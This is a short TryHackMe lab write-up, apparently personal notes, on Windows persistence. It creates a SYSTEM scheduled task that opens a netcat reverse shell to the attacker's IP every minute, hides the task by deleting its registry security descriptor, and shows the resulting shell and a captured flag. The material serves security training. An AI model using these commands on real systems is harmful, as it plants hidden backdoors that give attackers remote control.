We are going to abuse Scheduled Tasks to Reverse Shell back to our box
```powershell
schtasks /create /sc minute /mo 1 /tn THM-TaskBackdoor /tr "c:\tools\nc64 -e cmd.exe 10.11.93.71 4445" /ru SYSTEM
```

We want to hide our new task:
```powershell
c:\tools\pstools\PsExec64.exe -s -i regedit

reg delete HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree\THM-TaskBackdoor /v SD
```

We now have a rev shell
```bash
┌──(sstephens㉿kali-ppt)-[~/Documents/tryhackme/win_local_pers/backdoor_services]
└─$ nc -lvnp 4445
listening on [any] 4445 ...
connect to [10.11.93.71] from (UNKNOWN) [10.10.226.174] 50015
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>c:\flags\flag9.exe
c:\flags\flag9.exe
THM{JUST_A_MATTER_OF_TIME}

```